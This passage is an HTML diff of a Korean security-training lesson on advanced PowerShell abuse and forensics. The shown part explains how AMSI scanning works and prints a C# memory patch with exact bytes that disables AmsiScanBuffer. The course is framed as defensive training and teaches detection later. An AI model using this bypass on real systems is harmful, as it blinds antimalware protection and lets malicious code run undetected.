@@ -1,0 +1,2021 @@
+<!DOCTYPE html>
+<html lang="ko" class="light" data-technique-id="T1059.001" data-level="advanced">
+<head>
+    <script>
+        (function() {
+            if (new URLSearchParams(window.location.search).get('preview') === '1') return;
+            try {
+                var key = 'sb-bnwbybawqrnhznirivfg-auth-token';
+                var session = sessionStorage.getItem(key);
+                if (!session || !JSON.parse(session)) {
+                    var redirect = encodeURIComponent(window.location.href);
+                    window.location.replace('/login?redirect=' + redirect);
+                }
+            } catch(e) { window.location.replace('/login'); }
+        })();
+    </script>
+    <script>
+        var _eduDynLoaded = false;
+        (async function() {
+            try {
+                var SUPA = 'https://bnwbybawqrnhznirivfg.supabase.co';
+                var KEY  = 'sb_publishable_fiXeTnAxpTatUSnC0ZvOWg_x5eSbL1w';
+                var res = await fetch(SUPA + '/rest/v1/edu_html_content?page_id=eq.t1059-001-powershell-advanced&select=content&limit=1', { headers: { 'apikey': KEY, 'Authorization': 'Bearer ' + KEY } });
+                if (res.ok) { var data = await res.json(); if (data && data.length > 0 && data[0].content) { _eduDynLoaded = true; document.open(); document.write(data[0].content); document.close(); return; } }
+            } catch(e) {}
+            document.documentElement.classList.add('edu-ready');
+        })();
+        setTimeout(function() { if (!_eduDynLoaded) document.documentElement.classList.add('edu-ready'); }, 3000);
+    </script>
+    <style>html:not(.edu-ready) body { visibility: hidden; } html.edu-ready body { visibility: visible; }</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="(주)갓루트(GOTROOT) 사이버보안 교육 — T1059.001 고급: PowerShell 심화 — 우회 기법과 포렌식 분석">
+    <meta name="author" content="(주)갓루트 GOTROOT">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.tailwindcss.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob:; connect-src 'self' https://*.supabase.co; frame-src 'none'; object-src 'none'; base-uri 'self';" />
+    <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+    <meta name="referrer" content="strict-origin-when-cross-origin" />
+    <title>GOTROOT EDU | T1059.001 고급: PowerShell 심화 — 우회 기법과 포렌식 분석 — (주)갓루트</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = { darkMode: 'class', theme: { extend: { fontFamily: { sans: ['Inter','sans-serif'], mono: ['JetBrains Mono','monospace'] }, colors: { cbg:'#FFF8F0', cyel:'#F4D06F', cteal:'#9DD9D2', cdark:'#1e293b', cgray:'#475569', slate:{850:'#151e2e',900:'#0f172a',950:'#020617'} } } } }
+    </script>
+    <style>
+        body { scroll-behavior:smooth; background-color:#FFF8F0; color:#1e293b; transition:background-color .3s,color .3s; }
+        .glass-panel { background:rgba(255,255,255,.7); backdrop-filter:blur(16px); -webkit-backdrop-filter:blur(16px); border:1px solid rgba(239,68,68,.3); box-shadow:0 8px 32px rgba(30,41,59,.05); }
+        .dark body { background-color:#0f172a; color:#f8fafc; }
+        .dark .glass-panel { background:rgba(30,41,59,.7); border:1px solid rgba(239,68,68,.2); box-shadow:0 8px 32px rgba(0,0,0,.4); }
+        .hl-teal{color:#0f766e;font-weight:700} .dark .hl-teal{color:#9DD9D2}
+        .hl-yel{color:#b45309;font-weight:700} .dark .hl-yel{color:#F4D06F}
+        .hl-red{color:#dc2626;font-weight:700} .dark .hl-red{color:#f87171}
+        .nav-item.active{background:linear-gradient(90deg,rgba(239,68,68,.15) 0%,transparent 100%);border-left:4px solid #ef4444;color:#dc2626;font-weight:700}
+        .dark .nav-item.active{background:linear-gradient(90deg,rgba(248,113,113,.15) 0%,transparent 100%);border-left:4px solid #f87171;color:#f87171}
+        .terminal-bg{background-color:#1e293b;color:#9DD9D2;font-family:'JetBrains Mono',monospace}
+        .node-pulse{animation:pulse 2s infinite}
+        @keyframes pulse{0%{transform:scale(1);box-shadow:0 0 0 0 rgba(239,68,68,.7)}70%{transform:scale(1.05);box-shadow:0 0 0 10px rgba(239,68,68,0)}100%{transform:scale(1);box-shadow:0 0 0 0 rgba(239,68,68,0)}}
+        @keyframes typing{from{width:0}to{width:100%}}
+        @keyframes blink{50%{border-color:transparent}}
+        .typing-effect{overflow:hidden;white-space:nowrap;border-right:2px solid #9DD9D2;animation:typing 2s steps(40) forwards,blink .8s step-end infinite}
+        ::-webkit-scrollbar{width:8px} ::-webkit-scrollbar-track{background:transparent} ::-webkit-scrollbar-thumb{background:#ef4444;border-radius:4px} ::-webkit-scrollbar-thumb:hover{background:#dc2626} .dark ::-webkit-scrollbar-thumb{background:#f87171}
+        .drag-item{cursor:grab;user-select:none} .drag-item:active{cursor:grabbing} .drag-item.dragging{opacity:.5} .drag-over{border-color:#ef4444!important;background:rgba(239,68,68,.05)!important}
+    </style>
+</head>
+<body class="flex flex-col h-screen overflow-hidden selection:bg-red-200 selection:text-red-900 transition-colors duration-300">
+<!-- GOTROOT BRAND BANNER -->
+<div class="w-full px-4 py-1.5 flex items-center justify-between border-b border-slate-200 dark:border-slate-700 bg-white/90 dark:bg-slate-900/90 backdrop-blur-sm shrink-0 z-[60]" style="font-family:'JetBrains Mono',monospace">
+    <div class="flex items-center gap-2">
+        <span style="font-size:9px;font-weight:900;color:#bb3e03;letter-spacing:.25em">GOTROOT</span>
+        <span style="font-size:8px;color:#94a3b8">|</span>
+        <span style="font-size:8px;color:#64748b" class="hidden sm:inline">(주)갓루트 · 사이버보안 교육 플랫폼</span>
+    </div>
+    <div class="flex items-center gap-3">
+        <span style="font-size:8px;color:#ef4444;font-weight:700;background:rgba(239,68,68,.1);padding:2px 8px;border-radius:4px;border:1px solid rgba(239,68,68,.3)">ADVANCED</span>
+        <button onclick="goToDashboard()" style="font-size:8px;color:#bb3e03;background:transparent;border:1px solid rgba(187,62,3,.3);padding:3px 10px;border-radius:4px;cursor:pointer;font-family:inherit;transition:all .15s" onmouseover="this.style.background='rgba(187,62,3,.08)'" onmouseout="this.style.background='transparent'">← 매트릭스 대시보드</button>
+        <a href="https://gotroot.co.kr" target="_blank" rel="noopener noreferrer" style="font-size:8px;color:rgba(187,62,3,.5);text-decoration:none" class="hidden sm:inline" onmouseover="this.style.color='#bb3e03'" onmouseout="this.style.color='rgba(187,62,3,.5)'">gotroot.co.kr ↗</a>
+    </div>
+</div>
+<div class="flex flex-1 overflow-hidden">
+<!-- Theme Toggle -->
+<button onclick="toggleTheme()" class="fixed top-12 right-6 z-50 p-3 rounded-full glass-panel hover:scale-110 transition-transform shadow-lg border border-red-400"><span id="theme-icon" class="text-xl">🌙</span></button>
+<button onclick="goToDashboard()" class="fixed top-12 left-4 z-50 md:hidden flex items-center gap-1 glass-panel px-3 py-2 rounded-full text-xs font-bold text-slate-700 dark:text-slate-300 border border-red-400/50 hover:border-red-400 shadow transition-all">← 대시보드</button>
+<!-- Sidebar -->
+<aside class="w-64 glass-panel border-r border-red-400/30 h-full flex flex-col hidden md:flex shrink-0 z-40 relative">
+    <div class="p-6 border-b border-red-400/30">
+        <button onclick="goToDashboard()" class="flex items-center gap-1.5 text-xs text-slate-500 dark:text-slate-400 hover:text-red-700 dark:hover:text-red-400 mb-4 transition-colors group"><span class="group-hover:-translate-x-0.5 transition-transform">←</span><span>대시보드로 돌아가기</span></button>
+        <h1 class="text-xl font-bold font-mono hl-red tracking-tighter">ATT&CK Matrix</h1>
+        <p class="text-xs text-cgray dark:text-slate-400 mt-2">T1059.001: PowerShell</p>
+        <span class="inline-block mt-2 text-[10px] font-bold bg-red-500/10 text-red-600 dark:text-red-400 border border-red-400/30 px-2 py-0.5 rounded">🔴 고급 (Advanced)</span>
+    </div>
+    <nav class="flex-1 overflow-y-auto py-4" id="sidebar-nav">
+        <button onclick="go('ch1')" class="nav-item active w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-red-700 dark:hover:text-red-400" data-target="ch1">1. AMSI 내부 구조</button>
+        <button onclick="go('ch2')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-red-700 dark:hover:text-red-400" data-target="ch2">2. AMSI 우회 기법</button>
+        <button onclick="go('ch3')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-red-700 dark:hover:text-red-400" data-target="ch3">3. .NET 리플렉션 로딩</button>
+        <button onclick="go('ch4')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-red-700 dark:hover:text-red-400" data-target="ch4">4. 다운그레이드 공격</button>
+        <button onclick="go('ch5')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-red-700 dark:hover:text-red-400" data-target="ch5">5. WMI/CIM 원격 실행</button>
+        <button onclick="go('ch6')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-red-700 dark:hover:text-red-400" data-target="ch6">6. CLM 우회</button>
+        <button onclick="go('ch7')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-red-700 dark:hover:text-red-400" data-target="ch7">7. 포렌식 아티팩트</button>
+        <button onclick="go('ch8')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-red-700 dark:hover:text-red-400" data-target="ch8">8. Volatility 메모리 분석</button>
+        <button onclick="go('ch9')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-red-700 dark:hover:text-red-400" data-target="ch9">9. YARA 규칙 개발</button>
+        <button onclick="go('ch10')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-red-700 dark:hover:text-red-400" data-target="ch10">10. Sigma 고급 탐지</button>
+        <button onclick="go('ch11')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-red-700 dark:hover:text-red-400" data-target="ch11">11. 엔터프라이즈 방어</button>
+        <button onclick="go('ch12')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-red-700 dark:hover:text-red-400" data-target="ch12">12. IR 플레이북</button>
+        <button onclick="go('ch13')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-red-700 dark:hover:text-red-400" data-target="ch13">📝 종합 평가</button>
+    </nav>
+    <div class="p-5 border-t border-red-400/30 bg-white/50 dark:bg-slate-900/50">
+        <button onclick="goToLab()" class="w-full relative group rounded-lg p-[2px] bg-gradient-to-r from-red-500 to-rose-600 transition-all hover:shadow-[0_0_15px_rgba(239,68,68,.5)]">
+            <div class="relative bg-white dark:bg-slate-800 px-4 py-3 rounded-md flex flex-col items-center justify-center gap-1 transition-all group-hover:bg-opacity-80 dark:group-hover:bg-opacity-80">
+                <span class="text-2xl mb-1">💻</span>
+                <span class="font-bold text-slate-800 dark:text-white text-sm">실전 시뮬레이터 입장</span>
+                <span class="text-[10px] text-cgray dark:text-slate-400">PowerShell 공격 체험</span>
+            </div>
+        </button>
+    </div>
+</aside>
+<!-- Main Content -->
+<main class="flex-1 overflow-y-auto h-full relative scroll-smooth" id="main-scroll">
+<div class="max-w-4xl mx-auto p-6 md:p-12 pb-24 space-y-32">
+<!-- Header -->
+<header class="text-center pt-8">
+    <div class="inline-block px-4 py-1 rounded-full bg-red-500/10 border border-red-400 text-red-700 dark:text-red-400 font-mono text-sm mb-4 font-bold">🔴 Advanced — PowerShell 우회 &amp; 포렌식</div>
+    <h1 class="text-4xl md:text-5xl font-extrabold tracking-tight mb-4 text-[#1e293b] dark:text-white">PowerShell 심화 — 우회 기법과 포렌식 분석</h1>
+    <p class="text-cgray dark:text-slate-400 text-lg">AMSI 우회부터 메모리 포렌식, YARA/Sigma 탐지까지 — 공격과 방어의 최전선을 학습합니다</p>
+    <div class="flex items-center justify-center gap-4 mt-4 text-xs text-slate-500"><span>⏱ 약 120분</span><span>·</span><span>📚 12챕터 + 종합 평가</span><span>·</span><span>🧪 4개 미니 랩</span></div>
+</header>
+
+<!-- ═══════════════════ 개요 패널 ═══════════════════ -->
+<div class="glass-panel rounded-xl p-8 border-l-4 border-l-red-500 relative overflow-hidden">
+    <div class="absolute -top-6 -right-6 text-[120px] opacity-[0.04] select-none pointer-events-none">⚡</div>
+    <h2 class="text-2xl font-bold mb-4 text-red-700 dark:text-red-400">PowerShell이 왜 공격자의 최애 도구일까요? 🤔</h2>
+    <p class="text-sm text-cgray dark:text-slate-300 leading-relaxed mb-4">
+        중급에서 PowerShell 기본 악용 패턴을 다뤘죠? 하지만 실제 APT 그룹은 AMSI, Script Block Logging, Constrained Language Mode 같은 <span class="hl-red">다층 방어 체계</span>를 모두 우회합니다. PowerShell은 <strong>.NET Framework에 직접 접근</strong>할 수 있고, 운영체제의 거의 모든 기능을 호출할 수 있는 — 공격자에게는 스위스 아미 나이프 같은 존재입니다.
+    </p>
+    <p class="text-sm text-cgray dark:text-slate-300 leading-relaxed mb-6">
+        고급 과정에서는 <span class="hl-red">AMSI의 내부 동작 원리</span>를 C 코드 수준으로 파악하고, 메모리 패치부터 .NET 리플렉션, WMI 기반 원격 실행, 그리고 <strong>방어자 관점의 포렌식과 탐지 규칙 개발</strong>까지 — 공격과 방어의 양면을 모두 마스터합니다.
+    </p>
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+        <div class="bg-red-50 dark:bg-red-900/20 p-4 rounded-lg border border-red-300 dark:border-red-700 text-center">
+            <div class="text-2xl mb-2">🛡️</div>
+            <div class="font-bold text-sm text-red-700 dark:text-red-400">AMSI를 해부합니다</div>
+            <div class="text-xs text-slate-500 dark:text-slate-400 mt-1">AmsiScanBuffer의 내부 흐름을 C 코드로 분석하고 우회점을 찾습니다</div>
+        </div>
+        <div class="bg-purple-50 dark:bg-purple-900/20 p-4 rounded-lg border border-purple-300 dark:border-purple-700 text-center">
+            <div class="text-2xl mb-2">🔬</div>
+            <div class="font-bold text-sm text-purple-700 dark:text-purple-400">메모리 포렌식을 수행합니다</div>
+            <div class="text-xs text-slate-500 dark:text-slate-400 mt-1">Volatility로 PowerShell 프로세스 메모리를 덤프하고 악성 코드를 추출합니다</div>
+        </div>
+        <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-lg border border-amber-300 dark:border-amber-700 text-center">
+            <div class="text-2xl mb-2">📐</div>
+            <div class="font-bold text-sm text-amber-700 dark:text-amber-400">탐지 규칙을 만듭니다</div>
+            <div class="text-xs text-slate-500 dark:text-slate-400 mt-1">YARA와 Sigma로 난독화된 PowerShell 페이로드를 탐지하는 규칙을 작성합니다</div>
+        </div>
+    </div>
+    <div class="mt-6 bg-red-50 dark:bg-red-900/10 border border-red-300 dark:border-red-700 rounded-lg p-4">
+        <p class="text-sm text-red-700 dark:text-red-400 text-center">⚠️ <strong>교육 목적 안내</strong> — 이 과정의 모든 코드와 기법은 <strong>방어 연구 및 인가된 보안 테스트</strong>를 위한 것입니다. 허가 없는 시스템에서의 사용은 불법입니다.</p>
+    </div>
+</div>
+
+<!-- ═══════════════════ Chapter 1 ═══════════════════ -->
+<section id="ch1" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-red-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-red">#1.</span> AMSI 내부 구조 — AmsiScanBuffer 완전 해부</h2>
+    <div class="space-y-6">
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400 relative overflow-hidden">
+            <div class="absolute top-0 right-0 p-4 opacity-10 text-6xl">🔍</div>
+            <h3 class="font-bold text-xl mb-4 hl-red">비유: 공항 보안 검색대의 X-ray 스캐너</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-4 leading-relaxed"><strong>AMSI(Antimalware Scan Interface)</strong>는 Windows 10부터 도입된 스크립트 검사 인터페이스입니다. PowerShell, VBScript, JScript, .NET 등이 코드를 실행하기 <strong>직전에</strong> 해당 코드를 AV/EDR에 전달하여 검사받도록 강제합니다. 공항의 X-ray 스캐너처럼, 모든 스크립트는 이 검문소를 반드시 통과해야 합니다.</p>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-purple-400">
+            <h3 class="font-bold text-xl mb-4 text-purple-700 dark:text-purple-400">AMSI 아키텍처 개요</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">PowerShell 엔진 내부에서 스크립트가 어떤 경로를 거쳐 검사되는지 확인합니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+<pre class="text-center">
+┌──────────────────────────────────────────────────────┐
+│                PowerShell.exe (호스트)                  │
+│  ┌────────────────────────────────────────────────┐  │
+│  │  스크립트 입력: "IEX (New-Object ...)"          │  │
+│  └──────────────┬─────────────────────────────────┘  │
+│                 ▼                                      │
+│  ┌────────────────────────────────────────────────┐  │
+│  │  System.Management.Automation.dll               │  │
+│  │  → AmsiUtils.ScanContent() 호출                  │  │
+│  └──────────────┬─────────────────────────────────┘  │
+│                 ▼                                      │
+│  ┌────────────────────────────────────────────────┐  │
+│  │  amsi.dll (AMSI 인터페이스)                      │  │
+│  │  → AmsiScanBuffer() / AmsiScanString()          │  │
+│  └──────────────┬─────────────────────────────────┘  │
+│                 ▼                                      │
+│  ┌────────────────────────────────────────────────┐  │
+│  │  AV/EDR Provider (Windows Defender 등)           │  │
+│  │  → 시그니처 매칭 + 행위 분석                     │  │
+│  │  → AMSI_RESULT 반환 (CLEAN / DETECTED)           │  │
+│  └────────────────────────────────────────────────┘  │
+└──────────────────────────────────────────────────────┘
+</pre>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-emerald-400">
+            <h3 class="font-bold text-xl mb-4 text-emerald-600 dark:text-emerald-400">AmsiScanBuffer 내부 흐름 (C 의사코드)</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">amsi.dll 내부의 <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-xs">AmsiScanBuffer</code> 함수가 실제로 어떻게 동작하는지 역공학 기반 C 의사코드로 살펴봅니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500">// amsi.dll!AmsiScanBuffer 의사코드 (역공학 기반 재구성)</div>
+                <div class="text-white"><span class="text-purple-400">HRESULT</span> <span class="text-yellow-400">AmsiScanBuffer</span>(</div>
+                <div class="text-white ml-4"><span class="text-purple-400">HAMSICONTEXT</span> amsiContext,  <span class="text-slate-500">// AmsiInitialize()로 생성된 컨텍스트</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">PVOID</span>          buffer,       <span class="text-slate-500">// 스캔할 데이터 버퍼 (스크립트 코드)</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">ULONG</span>          length,       <span class="text-slate-500">// 버퍼 길이</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">LPCWSTR</span>        contentName,  <span class="text-slate-500">// 콘텐츠 이름 식별자</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">HAMSISESSION</span>   amsiSession,  <span class="text-slate-500">// 세션 핸들</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">AMSI_RESULT</span>   *result       <span class="text-slate-500">// [OUT] 스캔 결과 포인터</span></div>
+                <div class="text-white">) {</div>
+                <div class="text-white ml-4"><span class="text-slate-500">// ① 입력 파라미터 검증</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">if</span> (!amsiContext || !buffer || !length || !result)</div>
+                <div class="text-white ml-8"><span class="text-purple-400">return</span> <span class="text-red-400">E_INVALIDARG</span>;</div>
+                <div class="text-white"></div>
+                <div class="text-white ml-4"><span class="text-slate-500">// ② <span class="text-yellow-400 font-bold">컨텍스트 시그니처 무결성 검증 ← 핵심!</span></span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">if</span> (amsiContext-&gt;Signature != <span class="text-green-400">0x49534D41</span>)  <span class="text-slate-500">// 'AMSI'</span></div>
+                <div class="text-white ml-8"><span class="text-purple-400">return</span> <span class="text-red-400">E_INVALIDARG</span>;  <span class="text-slate-500">// ← 시그니처 깨지면 즉시 반환!</span></div>
+                <div class="text-white"></div>
+                <div class="text-white ml-4"><span class="text-slate-500">// ③ 등록된 모든 AV 프로바이더에게 순차 스캔 요청</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">for each</span> (provider in amsiContext-&gt;Providers) {</div>
+                <div class="text-white ml-8">hr = provider-&gt;Scan(amsiSession, buffer, length, result);</div>
+                <div class="text-white ml-8"><span class="text-purple-400">if</span> (*result &gt;= <span class="text-orange-400">AMSI_RESULT_DETECTED</span>)  <span class="text-slate-500">// 32768</span></div>
+                <div class="text-white ml-12"><span class="text-purple-400">return</span> <span class="text-green-400">S_OK</span>;  <span class="text-slate-500">// 악성 탐지됨 → 실행 차단</span></div>
+                <div class="text-white ml-4">}</div>
+                <div class="text-white ml-4">*result = <span class="text-green-400">AMSI_RESULT_CLEAN</span>;  <span class="text-slate-500">// 모든 프로바이더 통과</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">return</span> <span class="text-green-400">S_OK</span>;</div>
+                <div class="text-white">}</div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-amber-400">
+            <h3 class="font-bold text-xl mb-4 text-amber-700 dark:text-amber-400">HAMSICONTEXT 구조체 분석</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">PowerShell이 시작될 때 <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-xs">AmsiInitialize</code>가 호출되어 AMSI 컨텍스트를 생성합니다. 이 구조체를 이해하면 우회 포인트가 선명해집니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500">// HAMSICONTEXT 내부 구조 (비공식 역공학 결과)</div>
+                <div class="text-white"><span class="text-purple-400">typedef struct</span> _AMSI_CONTEXT {</div>
+                <div class="text-white ml-4"><span class="text-purple-400">DWORD</span>   Signature;    <span class="text-slate-500">// 'AMSI' (0x49534D41) ← 변조 대상 #1</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">PWCHAR</span>  AppName;      <span class="text-slate-500">// "PowerShell_C:\Windows\..."</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">DWORD</span>   ProviderCount; <span class="text-slate-500">// 등록된 AV 프로바이더 수</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">IAntimalwareProvider</span>* Providers[];</div>
+                <div class="text-white">} <span class="text-yellow-400">AMSI_CONTEXT</span>;</div>
+            </div>
+            <div class="mt-4 bg-red-50 dark:bg-red-900/20 p-4 rounded-lg border border-red-300 dark:border-red-700">
+                <div class="font-bold text-xs text-red-700 dark:text-red-400 mb-2">3가지 핵심 우회 포인트</div>
+                <ul class="text-xs text-slate-600 dark:text-slate-400 space-y-1.5">
+                    <li>• <strong>Signature 필드 변조</strong>: 0x49534D41 → 0x00000000 으로 변경하면 AmsiScanBuffer가 E_INVALIDARG 반환</li>
+                    <li>• <strong>AmsiScanBuffer 함수 프롤로그 패치</strong>: 첫 6바이트를 <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded">mov eax, 0x80070057; ret</code>로 덮어쓰기</li>
+                    <li>• <strong>AmsiOpenSession 패치</strong>: 세션 생성 자체를 실패시켜 후속 스캔을 전부 무력화</li>
+                </ul>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl">
+            <h3 class="font-bold text-lg mb-4 hl-red">AMSI 스캔 결과 코드 일람</h3>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="bg-green-50 dark:bg-green-900/20 p-4 rounded-lg border border-green-300 dark:border-green-700">
+                    <div class="font-bold text-sm text-green-700 dark:text-green-400 mb-2">안전 판정 (실행 허용)</div>
+                    <div class="text-xs text-slate-600 dark:text-slate-400 space-y-1 font-mono">
+                        <div>AMSI_RESULT_CLEAN         = 0     ✅</div>
+                        <div>AMSI_RESULT_NOT_DETECTED  = 1     ✅</div>
+                    </div>
+                </div>
+                <div class="bg-red-50 dark:bg-red-900/20 p-4 rounded-lg border border-red-300 dark:border-red-700">
+                    <div class="font-bold text-sm text-red-700 dark:text-red-400 mb-2">위협 판정 (실행 차단)</div>
+                    <div class="text-xs text-slate-600 dark:text-slate-400 space-y-1 font-mono">
+                        <div>AMSI_RESULT_BLOCKED_BY_ADMIN = 16384</div>
+                        <div>AMSI_RESULT_DETECTED         = 32768 🚫</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══════════════════ Chapter 2 ═══════════════════ -->
+<section id="ch2" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-red-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-red">#2.</span> AMSI 우회 기법 분석 — 메모리 패치, 리플렉션, CLR 후킹</h2>
+    <div class="space-y-6">
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400 relative overflow-hidden">
+            <div class="absolute top-0 right-0 p-4 opacity-10 text-6xl">💉</div>
+            <h3 class="font-bold text-xl mb-4 hl-red">비유: X-ray 스캐너의 렌즈를 가리기</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-4 leading-relaxed">AMSI 우회는 본질적으로 <strong>검사 기능 자체를 무력화</strong>하는 것입니다. 코드를 "안전하게" 만드는 게 아니라, 검사 장비의 렌즈를 가려서 아무것도 보지 못하게 만드는 기법입니다. 대표적인 3가지 접근법을 코드와 함께 살펴봅니다.</p>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-emerald-400">
+            <h3 class="font-bold text-xl mb-4 text-emerald-600 dark:text-emerald-400">방법 1: AmsiScanBuffer 메모리 패치 (가장 대표적)</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">amsi.dll이 프로세스 메모리에 로드된 후, <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-xs">AmsiScanBuffer</code> 함수의 시작 부분을 패치하여 항상 E_INVALIDARG를 반환하도록 합니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500">// C# 기반 AmsiScanBuffer 패치 원리 분석 (교육 목적)</div>
+                <div class="text-green-400">using System;</div>
+                <div class="text-green-400">using System.Runtime.InteropServices;</div>
+                <div class="text-white"></div>
+                <div class="text-cyan-400">public class AmsiPatchAnalysis {</div>
+                <div class="text-purple-400 ml-4">[DllImport("kernel32")]</div>
+                <div class="text-white ml-4">static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</div>
+                <div class="text-purple-400 ml-4">[DllImport("kernel32")]</div>
+                <div class="text-white ml-4">static extern IntPtr LoadLibrary(string name);</div>
+                <div class="text-purple-400 ml-4">[DllImport("kernel32")]</div>
+                <div class="text-white ml-4">static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,</div>
+                <div class="text-white ml-8">uint flNewProtect, out uint lpflOldProtect);</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500 ml-4">// Step 1: amsi.dll 핸들과 함수 주소 획득</div>
+                <div class="text-white ml-4">IntPtr hAmsi = LoadLibrary(<span class="text-green-400">"amsi.dll"</span>);</div>
+                <div class="text-white ml-4">IntPtr pASB = GetProcAddress(hAmsi, <span class="text-green-400">"AmsiScanBuffer"</span>);</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500 ml-4">// Step 2: 메모리 보호 속성 변경 (PAGE_EXECUTE_READWRITE)</div>
+                <div class="text-white ml-4">VirtualProtect(pASB, (UIntPtr)6, <span class="text-orange-400">0x40</span>, out uint oldProtect);</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500 ml-4">// Step 3: 패치 바이트 작성</div>
+                <div class="text-slate-500 ml-4">// x64: B8 57 00 07 80 = mov eax, 0x80070057 (E_INVALIDARG)</div>
+                <div class="text-slate-500 ml-4">//       C3             = ret</div>
+                <div class="text-yellow-400 ml-4">byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };</div>
+                <div class="text-white ml-4">Marshal.Copy(patch, 0, pASB, 6);</div>
+                <div class="text-cyan-400">}</div>
+            </div>
+            <div class="mt-4 bg-amber-50 dark:bg-amber-900/20 p-3 rounded-lg border border-amber-300 dark:border-amber-700">
+                <div class="font-bold text-xs text-amber-700 dark:text-amber-400 mb-1">패치 바이트 해석 (x64)</div>
+                <div class="text-xs text-slate-600 dark:text-slate-400 font-mono">B8 57 00 07 80 → <strong>mov eax, 0x80070057</strong> (HRESULT: E_INVALIDARG)<br>C3 → <strong>ret</strong> (함수 즉시 종료, 스캔 수행하지 않음)</div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-purple-400">
+            <h3 class="font-bold text-xl mb-4 text-purple-700 dark:text-purple-400">방법 2: .NET Reflection AmsiUtils 필드 변조</h3>
